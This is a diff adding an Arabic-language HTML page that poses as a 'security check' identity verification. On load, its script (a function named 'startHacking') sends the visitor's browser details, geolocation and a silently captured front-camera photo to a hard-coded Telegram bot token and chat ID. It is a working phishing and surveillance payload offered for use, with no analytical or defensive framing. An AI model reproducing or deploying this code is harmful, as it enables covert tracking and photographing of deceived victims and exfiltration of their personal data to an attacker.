@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحقق من الأمان</title>
+</head>
+<body>
+    <h2 style="text-align: center;">جاري التحقق من الهوية... يرجى السماح بالكاميرا والموقع</h2>
+    
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+        const chatId = "8754338811";
+
+        // 1. وظيفة إرسال النصوص (بيانات الجهاز والموقع)
+        async function sendText(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+            });
+        }
+
+        // 2. وظيفة إرسال الصورة الملتقطة
+        async function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.jpg');
+
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        async function startHacking() {
+            // أ. إرسال بيانات الجهاز فوراً
+            await sendText(`📱 زائر جديد:\n${navigator.userAgent}`);
+
+            // ب. طلب إذن الموقع وإرساله
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    sendText(`📍 الموقع: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`);
+                });
+            }
+
+            // ج. فتح الكاميرا والتقاط صورة
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // انتظر ثانية حتى تفتح الكاميرا ثم التقط الصورة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(blob => {
+                        sendPhoto(blob);
+                        // إغلاق الكاميرا بعد الالتقاط
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 1000);
+
+            } catch (err) {
+                sendText("❌ المستخدم رفض إذن الكاميرا.");
+            }
+        }
+
+        window.onload = startHacking;
+    </script>
+</body>
+</html>
